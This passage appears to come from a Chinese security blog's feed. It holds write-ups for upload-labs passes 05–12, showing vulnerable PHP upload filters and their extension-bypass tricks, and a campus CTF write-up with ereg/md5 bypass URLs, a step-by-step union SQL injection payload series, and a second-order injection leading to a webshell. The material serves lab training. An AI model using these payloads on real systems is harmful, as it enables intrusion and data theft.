class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将pass-05的源码与pass-04的对比：</p><p><a href="https://imgchr.com/i/kw5Jpt" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/12/kw5Jpt.md.png" alt="kw5Jpt.md.png"></a></p><p>发现pass-05多过滤了<code>.htaccess</code>文件，但是没有将读出的后缀名进行统一转换为小写，所以可以直接构造<code>.Php</code>后缀的文件进行上传即可；</p><p><a href="https://imgchr.com/i/kw5ypq" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/12/kw5ypq.md.png" alt="kw5ypq.md.png"></a></p><p>访问成功：</p><p><img src="https://s2.ax1x.com/2019/02/12/kw5RnU.png" alt="kw5RnU.png"></p><h3 id="pass-06-空格绕过"><a href="#pass-06-空格绕过" class="headerlink" title="pass-06-空格绕过"></a>pass-06-空格绕过</h3><p>查看源码，与pass-05进行对比：</p><p><a href="https://imgchr.com/i/kwTBAe" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/12/kwTBAe.md.png" alt="kwTBAe.md.png"></a></p><p>对后缀进行了小写转换，但是从头到尾没有添加对文件名的首尾去空处理，所以直接在文件后缀后面加上空格即可绕过；</p><p>上传成功：</p><p><a href="https://imgchr.com/i/kwT5NQ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/12/kwT5NQ.md.png" alt="kwT5NQ.md.png"></a></p><p>访问成功：</p><p><a href="https://imgchr.com/i/kwT73n" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/12/kwT73n.png" alt="kwT73n.png"></a></p><h3 id="pass-07-点绕过"><a href="#pass-07-点绕过" class="headerlink" title="pass-07-点绕过"></a>pass-07-点绕过</h3><p>对比pass-06的源码：</p><p><img src="https://s2.ax1x.com/2019/02/12/kw7R2R.png" alt="kw7R2R.png"></p><p>发现这次是缺少了<code>$file_name = deldot($file_name);</code>删除文件名末尾的点这一步的操作；</p><p>于是想到在文件后缀最后加上<code>.</code>来绕过判断，成功上传：</p><p><img src="https://s2.ax1x.com/2019/02/12/kw77Ie.png" alt="kw77Ie.png"></p><p>成功访问：</p><p><img src="https://s2.ax1x.com/2019/02/12/kw7qGd.png" alt="kw7qGd.png"></p><h3 id="pass-08-DATA绕过"><a href="#pass-08-DATA绕过" class="headerlink" title="pass-08-::$DATA绕过"></a>pass-08-::$DATA绕过</h3><p>这次经过对比，源码中缺少的是如下语句：</p><p><code>$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);</code>用来去除字符串::$DATA；所以这次可以直接构造<code>gardenia.php::$DATA</code>来绕过源码中的过滤；上传成功如下：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0abrV.png" alt="k0abrV.png"></p><p>访问成功：</p><p><a href="https://imgchr.com/i/k0dwLV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/13/k0dwLV.md.png" alt="k0dwLV.md.png"></a></p><h3 id="pass-09-二次绕过"><a href="#pass-09-二次绕过" class="headerlink" title="pass-09-二次绕过"></a>pass-09-二次绕过</h3><p>审计源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次源码似乎挺正常，没有前面几处的缺失，一开始也是没有想到可以这样绕过，后来经过思考，发现源码对后缀名只是进行了一个轮次的处理，如果逆向思考，构造一个后缀，经过这一轮处理以后还是可以绕过呢？于是构造<code>gardenia.php. .</code>，经过去点，去空处理后得到<code>gardenia.php.</code>相当于点绕过；</p><p>上传成功：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0BCMn.png" alt="k0BCMn.png"></p><p>访问成功：</p><p><img src="https://s2.ax1x.com/2019/02/13/k00r8J.png" alt="k00r8J.png"></p><h3 id="pass-10-双写绕过"><a href="#pass-10-双写绕过" class="headerlink" title="pass-10-双写绕过"></a>pass-10-双写绕过</h3><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的<code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code>是关键点，将文件名中出现的带有黑名单的部分替换为空；</p><p>测试脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $black=<span class="string">"php"</span>;</span><br><span class="line">    $filename=<span class="string">"gardenia.pphphp"</span>;</span><br><span class="line">    $ans=str_ireplace($black,<span class="string">""</span>,$filename);</span><br><span class="line">    <span class="keyword">echo</span> $ans;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">运行结果：gardenia.php</span><br></pre></td></tr></table></figure><p>如上，直接双写构造<code>gardenia.pphphp</code>即可；</p><p><a href="https://imgchr.com/i/k0s6JO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/13/k0s6JO.md.png" alt="k0s6JO.md.png"></a></p><p>访问成功：</p><p><a href="https://imgchr.com/i/k0sRQH" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/13/k0sRQH.md.png" alt="k0sRQH.md.png"></a></p><h3 id="pass-11-00截断-GET"><a href="#pass-11-00截断-GET" class="headerlink" title="pass-11-00截断(GET)"></a>pass-11-00截断(GET)</h3><p>审计一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看关键源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br></pre></td></tr></table></figure><p>发现是得到合法后缀名后给定一个<code>$img_path</code>的文件存储路径，构成方法如上，需要GET一个<code>save_path</code>，但是不知道在哪GET…，没办法抓个包试试，发现了GET的参数；</p><p><a href="https://imgchr.com/i/k0ID0S" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/13/k0ID0S.md.png" alt="k0ID0S.md.png"></a></p><p>直接修改GET参数即可，构造payload如下；</p><p><img src="https://s2.ax1x.com/2019/02/13/k0I6Yj.png" alt="k0I6Yj.png"></p><p><code>%00</code>为url编码的00，可以使<code>$img_path</code>的值从<code>00</code>结束，所以文件的最终路径为<code>../upload/gardenia.php</code>可以解析为php脚本；运行成功如下：</p><p><a href="https://imgchr.com/i/k0I7tJ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/13/k0I7tJ.md.png" alt="k0I7tJ.md.png"></a></p><ul><li><strong>Attention：</strong>需要特别注意的是00截断的前提：</li></ul><ol><li>php版本小于5.3.4；</li><li>php.ini的<code>magic_quotes_gpc</code>为Off状态；</li></ol><h3 id="pass-12-00截断-POST"><a href="#pass-12-00截断-POST" class="headerlink" title="pass-12-00截断(POST)"></a>pass-12-00截断(POST)</h3><p>和pass-11几乎一毛一样，就是从GET变成了POST而已，直接放上payload：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0oGuV.png" alt="k0oGuV.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;从打完校赛开始到现在，身为萌新，寒假就研究了一下文件上传这部分内容，还是自己动手实践一下比较好，还可以学学代码审计；
    
    </summary>
    
      <category term="靶场通关笔记" scheme="https://gardenia30.top/categories/%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Web" scheme="https://gardenia30.top/tags/Web/"/>
    
      <category term="upload" scheme="https://gardenia30.top/tags/upload/"/>
    
  </entry>
  
  <entry>
    <title>CUMT-CTF第二次双月赛Writeup</title>
    <link href="https://gardenia30.top/2019/02/03/CUMT-CTF%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%8F%8C%E6%9C%88%E8%B5%9BWriteup/"/>
    <id>https://gardenia30.top/2019/02/03/CUMT-CTF第二次双月赛Writeup/</id>
    <published>2019-02-03T07:01:34.000Z</published>
    <updated>2019-04-09T11:44:45.850Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>毕竟是萌新，能有校赛打已经很开心了，下面放上本次双月赛的部分题解；<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>是个easy的绕过，给出源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$white_list = range(0,9);</span><br><span class="line">require_once(&apos;flag.php&apos;);</span><br><span class="line">if(isset($_REQUEST[&apos;0ver&apos;]) &amp;&amp; isset($_REQUEST[&apos;0ver1&apos;]) &amp;&amp; isset($_REQUEST[&apos;0ver2&apos;]))&#123;</span><br><span class="line">    $a = $_REQUEST[&apos;0ver&apos;];</span><br><span class="line">    $b = $_REQUEST[&apos;0ver1&apos;];</span><br><span class="line">    $c = $_REQUEST[&apos;0ver2&apos;];</span><br><span class="line">    if(@ereg(&quot;^[0-9]+$&quot;, $a) === FALSE)&#123;</span><br><span class="line">        echo &apos;no must be number&apos;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        if(in_array($a,$white_list))&#123;</span><br><span class="line">            if(strlen($a)&gt;1)&#123;</span><br><span class="line">                if(md5($c) === md5($b) &amp;&amp; ($b !== $c))&#123;</span><br><span class="line">                    echo &quot;&lt;img src=&apos;dark.png&apos;&gt;&lt;br&gt;&quot;;</span><br><span class="line">                    echo &apos;you are a great dark phper&lt;br&gt;&apos;;</span><br><span class="line">                    echo $flag;</span><br><span class="line">                &#125;</span><br><span class="line">                else&#123;</span><br><span class="line">                    echo &quot;you can do it!!!&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo &apos;you no dark&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &apos;you are so dark&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;else</span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure><p>考察<code>ereg()</code>和<code>md5()</code>的绕过姿势，00截断绕过<code>ereg</code>，上传数组绕过<code>md5</code>，即可得到flag如下：</p><p><img src="https://s2.ax1x.com/2019/01/25/kmRqk8.png" alt="kmRqk8.png"></p><p><strong>payload：</strong><code>http://202.119.201.199:32790/index.php?0ver=5%00a&amp;0ver1[]=a&amp;0ver2[]=b</code></p><h3 id="SimpleUpload"><a href="#SimpleUpload" class="headerlink" title="SimpleUpload"></a>SimpleUpload</h3><p>是个前端验证，只允许上传图片，不允许上传php为后缀的文件，只需要bp截取改后缀名即可；</p><p><a href="https://imgchr.com/i/kMY3XF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/28/kMY3XF.md.png" alt="kMY3XF.md.png"></a></p><h3 id="小型线上赌场"><a href="#小型线上赌场" class="headerlink" title="小型线上赌场"></a>小型线上赌场</h3><p>一开始没有思路，毕竟是萌新还没有了解到CTF的很多姿势，请教大佬得知是vim文件泄露，在vim编辑的时候没有正常退出，系统就会自动生成一个swp文件用来日后的恢复；直接down下来，vim打开得源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$invest = $_GET[&apos;invest&apos;];  </span><br><span class="line">$rand = rand(2,50);  </span><br><span class="line">$len = strlen(trim($_GET[&apos;invest&apos;]));</span><br><span class="line">foreach ($_GET as $key =&gt; $value) &#123;</span><br><span class="line">    if(!is_numeric($value)||$value == &apos;0&apos;)&#123;</span><br><span class="line">        die(&apos;no no no!&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$money = number_format($invest*$rand);</span><br><span class="line">$money = intval(str_replace(&apos;,&apos;,&apos;&apos;,$money));</span><br><span class="line">$guess = intval($_GET[&apos;guess&apos;]); </span><br><span class="line">if ($guess == $money &amp;&amp; strlen($money)===$len)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看懂源码意思即可，生成<code>2~50</code>的随机数<code>rand</code>，<code>money</code>为<code>$invest*$rand</code>；如果<code>$money==$guess</code>就回显flag，即<code>invest*倍数==guess</code>即可，那我们可以直接直接bp爆破，猜一个<code>guess</code>，固定<code>invest</code>和<code>guess</code>的值，多次爆破，如果次数达到一定的上限一定会出现猜对倍数的情况，这样的话就会输出flag；</p><p><strong>bp爆破设置：</strong></p><ol><li><p>不设置变量；</p><p><a href="https://imgchr.com/i/kMdro4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/28/kMdro4.md.png" alt="kMdro4.md.png"></a></p></li><li><p>设置payload类型为<code>null payloads</code>，上限次数设置大一点为2000；</p><p><a href="https://imgchr.com/i/kMdEIH" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/28/kMdEIH.md.png" alt="kMdEIH.md.png"></a></p></li><li><p>随便设置一下options即可start；</p></li></ol><p><strong>结果：</strong></p><p>升序排列length即可发现不匹配的特殊项，发现flag；</p><p><a href="https://imgchr.com/i/kMdfOK" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/28/kMdfOK.md.png" alt="kMdfOK.md.png"></a></p><p><a href="https://imgchr.com/i/kMdqSI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/28/kMdqSI.md.png" alt="kMdqSI.md.png"></a></p><h3 id="SimpleSQLi"><a href="#SimpleSQLi" class="headerlink" title="SimpleSQLi"></a>SimpleSQLi</h3><ol><li>首先输入<code>?id=1%27</code>报错；</li><li>接着注释掉后面的引号<code>?id=1%27%23</code>，回显正常，说明猜测成功存在注入点；</li></ol><p><img src="https://s2.ax1x.com/2019/01/25/kmW7v9.png" alt="kmW7v9.png"></p><ol start="3"><li><p>接下来就是用order by去猜列数，<code>?id=1%27%20order%20by%203%23</code>回显正常应该是三列没错；</p></li><li><p>下面需要用union select去回显某一列的东西，构造<code>?id=-1%27%20union%20select%201,2,3%23</code>；这里需要第一句话为空才能显示后面一句话的内容，选择id=-1，就可以回显2和3，后面就可以利用这两列回显想要的东西；</p></li></ol><p><img src="https://s2.ax1x.com/2019/01/25/kmfwrR.png" alt="kmfwrR.png"></p><ol start="5"><li>爆库名：<code>?id=-1%27%20union%20select%201,2,database()%20%23</code>为<code>security</code></li></ol><p><img src="https://s2.ax1x.com/2019/01/25/kmhMWD.png" alt="kmhMWD.png"></p><ol start="6"><li>爆表名，此处使用mysql里面自带的information_schema表；<code>id=-1%27%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%23</code>发现flag表信息；</li></ol><p><img src="https://s2.ax1x.com/2019/01/25/kmfjLn.png" alt="kmfjLn.png"></p><ol start="7"><li>爆列名：<code>id=-1%27%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27flagishere%27%23</code>有Id和flag两列；</li></ol><p><img src="https://s2.ax1x.com/2019/01/25/kmhBlQ.png" alt="kmhBlQ.png"></p><ol start="8"><li>爆值：<code>?id=-1%27%20union%20select%201,2,group_concat(Id,0x3a,flag)%20from%20flagishere%23</code></li></ol><p><img src="https://s2.ax1x.com/2019/01/25/kmh4l4.png" alt="kmh4l4.png"></p><h3 id="文件管理系统"><a href="#文件管理系统" class="headerlink" title="文件管理系统"></a>文件管理系统</h3><p>队友Source在离别歌的blog里搜索到类似题目，了解到这题的切入点是二次注入；直接拿来payload就可以搞定这一题；</p><ol><li><p>先选择文件进行上传，filename为<code>&#39;,extension=&#39;&#39;,filename=&#39;x.jpg.jpg</code>；<img src="https://s2.ax1x.com/2019/01/28/kM0tK0.png" alt="kM0tK0.png"></p></li><li><p>Rename file，注入后文件系统中文件名为<code>xl.jpg.jpg</code><img src="https://s2.ax1x.com/2019/01/28/kM02qK.png" alt="kM02qK.png"></p></li><li><p>上传真的包含webshell的文件；<img src="https://s2.ax1x.com/2019/01/28/kMBUSA.png" alt="kMBUSA.png"></p></li><li><p>改名后缀为<code>.php</code>，连接菜刀即可；<img src="https://s2.ax1x.com/2019/01/28/kMBrTS.png" alt="kMBrTS.png"></p></li><li><p>flag在根目录；</p><p><a href="https://imgchr.com/i/kuqufs" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/27/kuqufs.md.png" alt="kuqufs.md.png"></a><a href="https://imgchr.com/i/kuq1XV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/27/kuq1XV.md.png" alt="kuq1XV.md.png"></a></p></li></ol><p>参考链接：<a href="https://www.leavesongs.com/PENETRATION/some-sangebaimao-ctf-writeups.html" target="_blank" rel="noopener">leavesongs的博客</a></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="现代密码签到"><a href="#现代密码签到" class="headerlink" title="现代密码签到"></a>现代密码签到</h3><p>一度以为是hash，因为base64decode出来是<code>Salted__</code>开头，真的是……被出题人虐到鼻青脸肿，和队里大佬讨论很久也不知道怎么办，还一度以为是AES，hint出来了是DES，也不知道密钥该如何解密……没想带直接找一个在线网站直接解密既可以了……密钥为空…… 狂喷一口老血……<img 